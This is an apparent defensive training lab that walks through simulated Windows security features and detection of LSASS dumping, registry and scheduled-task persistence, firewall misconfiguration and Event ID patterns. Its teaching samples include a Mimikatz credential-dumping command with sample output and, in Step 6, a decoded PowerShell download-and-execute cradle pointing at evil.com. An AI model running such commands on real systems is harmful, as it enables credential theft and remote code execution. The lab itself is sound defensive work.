# Demo 01: Windows Security Features Walkthrough

**Estimated time:** 35 minutes

---

## Overview

This demo uses a Docker container running PowerShell Core to simulate a Windows security environment.
You will explore the key Windows security features covered in the reading: LSASS protection, SAM access patterns, UAC integrity levels, AppLocker simulation, Windows Firewall, and credential protection mechanisms.

Because a full Windows OS cannot run in Docker on Linux, this demo uses:

* PowerShell Core (`pwsh`) with simulated Windows security data
* Pre-populated JSON data files representing realistic Windows security states
* Scripts that mimic the PowerShell cmdlets used on real Windows systems

---

## Learning Objectives

* Understand the role of LSASS and how attackers target it
* Interpret SID-based access tokens and integrity levels
* Review Windows Firewall rules and AppLocker policies
* Identify suspicious entries in registry Run keys and scheduled tasks
* Detect service-based persistence (Event ID 7045 patterns)
* Understand Credential Guard protection model

---

## Prerequisites

* Docker installed and running

---

## Setup

```console
cd demos/demo-01-windows-security-features
docker compose up --build
docker compose run win-security pwsh
```

---

## Step 1: Explore the Windows Identity Model

Inside the container, examine how Windows represents user identity:

```powershell
# Load simulated security data
. /scripts/load-data.ps1

# Review user accounts and their SIDs
Show-LocalUsers

# Expected output:
# Name          SID                          Enabled  PasswordNeverExpires  Groups
# ----          ---                          -------  --------------------  ------
# Administrator S-1-5-21-[domain]-500        False    True                  Administrators
# Guest         S-1-5-21-[domain]-501        False    True                  Guests
# alice         S-1-5-21-[domain]-1001       True     False                 Users
# devops        S-1-5-21-[domain]-1002       True     True                  Administrators,Users (!)
```

**Analysis questions:**

1. Which account has a non-expiring password but is in the Administrators group?
1. What does SID `-500` indicate?
1. Why is a user account in Administrators a potential security risk?

```powershell
# Examine the token structure for an interactive user session
Show-AccessToken -User "devops"

# Output shows:
# TokenType:         Primary (interactive session)
# IntegrityLevel:    Medium (0x2000) -- normal user mode
# ElevatedToken:     High  (0x3000) -- admin mode (requires UAC prompt)
# Privileges:
#   SeShutdownPrivilege       (disabled - only enabled on demand)
#   SeChangeNotifyPrivilege   (enabled - traverse directories)
#   SeUndockPrivilege         (disabled)
```

**Key insight:** UAC splits admin accounts into two tokens.
Malware running at Medium integrity cannot write to High integrity objects (system directories, HKLM registry).

---

## Step 2: Understand LSASS and Credential Protection

```powershell
# LSASS stores sensitive credential material
# Review what credential types LSASS holds
Show-LsassCredentials

# Output (from simulated data):
# CredentialType    Count  ProtectionStatus
# --------------    -----  ----------------
# NTLM Hashes         3    Exposed (Credential Guard: OFF)
# Kerberos Tickets    2    Exposed (Credential Guard: OFF)
# Wdigest Plaintext   3    *** RISK: Wdigest enabled! Plaintext stored! ***
#
# LSA Protection (RunAsPPL): DISABLED
# Credential Guard:           DISABLED
```

**What Mimikatz could extract from this LSASS configuration:**

```text
mimikatz # sekurlsa::logonpasswords
Authentication Id : 0 ; 99372 (00000000:000183ec)
Session           : Interactive from 1
UserName          : alice
Domain            : CORP
Password          : Password123!   <-- plaintext because Wdigest is enabled!
NTLM              : 8846f7eaee8fb117ad06bdd830b7586c
```

**Review protections that could prevent this:**

```powershell
# Show what Credential Guard does
Describe-CredentialGuard

# Show how RunAsPPL protects LSASS
Describe-LsaProtection

# Show detection: Sysmon Event 10 triggers on LSASS access
Show-SysmonEvent10Pattern
```

**Detection via Sysmon Event ID 10 (ProcessAccess):**

```xml
<!-- Generated when a process opens LSASS for reading -->
<EventData>
  <Data Name="SourceProcessId">4712</Data>
  <Data Name="SourceImage">C:\Users\alice\AppData\Local\Temp\dump.exe</Data>
  <Data Name="TargetImage">C:\Windows\system32\lsass.exe</Data>
  <Data Name="GrantedAccess">0x1010</Data>  <!-- PROCESS_VM_READ + QUERY_INFO -->
</EventData>
```

---

## Step 3: Windows Registry — Security-Relevant Keys

```powershell
# Examine persistence-relevant registry keys
Show-RegistryPersistence

# HKLM Run keys (system-wide autostart):
# Name          Value                                    Status
# ----          -----                                    ------
# SecurityHealth C:\Windows\System32\SecurityHealthSystray.exe  LEGITIMATE
# OneDriveSetup  C:\Windows\SysWOW64\OneDriveSetup.exe          LEGITIMATE
# WindowsUpdtr   C:\Users\alice\AppData\Local\Temp\svc.exe      *** SUSPICIOUS ***

# HKCU Run keys (per-user autostart):
# Name          Value                                    Status
# ----          -----                                    ------
# (empty)
```

**Analyze the suspicious entry:**

```powershell
# Investigate the suspicious process
Investigate-RunKey "WindowsUpdtr"

# Output:
# Path:       C:\Users\alice\AppData\Local\Temp\svc.exe
# Exists:     True (but this might be malware!)
# Signed:     False (no digital signature!)
# Location:   TEMP directory (NEVER legitimate for autostart)
# Hash:       SHA256: a1b2c3d4... (check VirusTotal)
#
# VERDICT: HIGH SUSPICION - Remove and investigate
```

```powershell
# Review Winlogon keys (rootkit vector)
Show-WinlogonKeys

# Expected clean output:
# Userinit = C:\Windows\system32\userinit.exe,  (comma is required!)
# Shell    = explorer.exe
#
# Malware indicator: Shell = explorer.exe,C:\malware.exe
# Malware indicator: Userinit = userinit.exe,C:\backdoor.exe
```

---

## Step 4: Windows Firewall Rules Analysis

```powershell
# Review firewall profile status
Show-FirewallProfiles

# Domain Profile:  Enabled=True, Inbound=Block, Outbound=Allow  [PASS]
# Private Profile: Enabled=True, Inbound=Block, Outbound=Allow  [PASS]
# Public Profile:  Enabled=True, Inbound=Block, Outbound=Allow  [PASS]

# Review risky inbound rules
Show-FirewallRiskyRules

# ENABLED INBOUND RULES OF CONCERN:
# Rule: File and Printer Sharing (SMB-In) -- Port 445 open (WARN if server)
# Rule: Remote Desktop (TCP-In) -- Port 3389 open (WARN if not required)
# Rule: WMI-In (DCOM) -- Port 135 open (WARN if not managed host)
# Rule: AllowAll-Inbound -- ANY ANY ALLOW (*** CRITICAL: overly permissive! ***)
```

**The dangerous "AllowAll-Inbound" rule:**

```powershell
# This is a classic indicator of malware or misconfiguration
# Identify who created this rule and when (requires audit log)
Get-FirewallRuleDetails "AllowAll-Inbound"

# Created: 2024-01-14 03:22:18 UTC
# ModifiedBy: NT AUTHORITY\SYSTEM
# This was created in the middle of the night by SYSTEM — SUSPICIOUS
```

---

## Step 5: AppLocker Policy Review

```powershell
# View AppLocker policy (simulated)
Show-AppLockerPolicy

# EXE Rules:
# Allow: Publisher = "O=MICROSOFT CORPORATION" (Windows binaries)
# Allow: Publisher = "O=ADOBE INC" (Adobe apps)
# Allow: Path = "%PROGRAMFILES%\*" (installed apps)
# BLOCK: Path = "%TEMP%\*" (block execution from Temp!)
# BLOCK: Path = "%USERPROFILE%\Downloads\*"

# Script Rules:
# Allow: Publisher = "O=MICROSOFT CORPORATION"
# BLOCK: Path = "C:\Users\*" (block user scripts)

# MSI Rules:
# Allow: Publisher = "O=MICROSOFT CORPORATION"
# Allow: Publisher = "O=ORACLE CORPORATION"
```

```powershell
# Simulate testing files against the policy
Test-AppLockerFile "C:\Windows\System32\cmd.exe"     # ALLOWED
Test-AppLockerFile "C:\Users\alice\AppData\Local\Temp\svc.exe"  # BLOCKED!
Test-AppLockerFile "C:\Program Files\7-Zip\7z.exe"  # ALLOWED

# The suspicious entry from Step 3 would be BLOCKED by AppLocker
# This is why attackers target AppLocker bypass techniques
```

---

## Step 6: Review Scheduled Tasks for Persistence

```powershell
# Review all non-Microsoft scheduled tasks
Show-ScheduledTasks

# === Non-Microsoft Scheduled Tasks ===
# Name: Adobe Acrobat Update Task  -- Path: \Adobe\  -- NORMAL
# Name: Google Update Task         -- Path: \Google\  -- NORMAL
# Name: Windows Telemetry Helper   -- Path: \         -- SUSPICIOUS (root level!)
#   Action: powershell.exe -WindowStyle Hidden -EncodedCommand SQBFAFgA...
#   Trigger: At logon of any user
#   RunAs: SYSTEM

# The base64-encoded PowerShell in root task path is a classic malware indicator
```

```powershell
# Decode the suspicious command
Decode-ScheduledTask "Windows Telemetry Helper"

# EncodedCommand decoded: IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
# VERDICT: This is a classic PowerShell web cradle (download and execute)
# The attacker is downloading a remote payload at every user logon
```

---

## Step 7: Event ID Pattern Recognition

```powershell
# Review sample security events for attack patterns
Show-SecurityEvents -Type Attack

# === ATTACK PATTERN 1: Brute Force (Event 4625) ===
# 14:23:01 - 4625 - Failed logon: alice from 192.168.100.50 (Type 3, Network)
# 14:23:02 - 4625 - Failed logon: alice from 192.168.100.50 (Type 3, Network)
# ... (repeated 247 times) ...
# 14:47:23 - 4624 - Successful logon: alice from 192.168.100.50 (Type 3, Network)

# === ATTACK PATTERN 2: Credential Dumping (Sysmon 10 → LSASS access) ===
# 14:48:02 - Sysmon 10 - ProcessAccess: dump.exe (PID:4712) → lsass.exe
#   GrantedAccess: 0x1010 (PROCESS_VM_READ)

# === ATTACK PATTERN 3: Persistence via Service (Event 7045) ===
# 14:50:15 - 7045 - Service installed: "Windows Telemetry Helper"
#   Path: C:\ProgramData\svchost.exe
#   Start: Auto
#   Account: LocalSystem

# === ANTI-FORENSICS INDICATOR (Event 1102) ===
# 15:10:44 - 1102 - Security audit log cleared by CORP\alice
```

**Discussion questions:**

1. What is the significance of the 6-minute gap between brute force success and credential dump?
1. Why does the attacker clear the event log at the end?
1. Which detection would have caught this attack earliest?

---

## Clean Up

```console
docker compose down
```

---

## Key Takeaways

* **LSASS memory** contains credential material that Mimikatz can extract; protect with PPL and Credential Guard
* **Registry Run keys** in `%TEMP%` paths are a near-certain malware indicator
* **AppLocker** blocks execution from Temp/Downloads; attackers use LOLBins or bypass techniques to circumvent it
* **Event ID 7045** (service install) + **1102** (log cleared) together strongly indicate an active attack
* **Sysmon Event 10** targeting `lsass.exe` is the most reliable LSASS dump detection indicator
